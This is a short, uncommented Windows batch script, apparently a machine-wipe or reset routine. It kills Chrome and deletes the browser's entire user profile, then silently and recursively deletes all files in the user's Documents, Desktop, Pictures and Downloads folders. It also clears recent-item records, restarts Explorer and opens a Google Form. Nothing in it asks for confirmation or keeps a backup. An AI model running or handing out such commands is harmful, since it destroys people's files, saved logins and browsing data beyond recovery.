@echo off

taskkill /F /IM chrome.exe /T


set ChromeDir=C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data
set Documents=C:\Users\%USERNAME%\Documents\
set Desktop=C:\Users\%USERNAME%\Desktop\
set Pictures=C:\Users\%USERNAME%\Pictures\
set Downloads= C:\Users\%USERNAME%\Downloads\
set Recents= %AppData%\Microsoft\Windows\Recent\

del /q /s /f "%ChromeDir%"
rd /s /q "%ChromeDir%"

del /q /s /f "%Documents%"
del /q /s /f "%Desktop%"
del /q /s /f "%Pictures%"
del /q /s /f "%Downloads%"

del /F /Q %APPDATA%\Microsoft\Windows\Recent\*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\*
del /F /Q %APPDATA%\Microsoft\Windows\Recent\CustomDestinations\*
taskkill /f /im explorer.exe
start explorer.exe

start chrome https://docs.google.com/forms/d/e/1FAIpQLSdpeyvOBks6QBCz8PJeVibY6jwf7VNbJ9GCxjv4CpvvuRl9ew/viewform
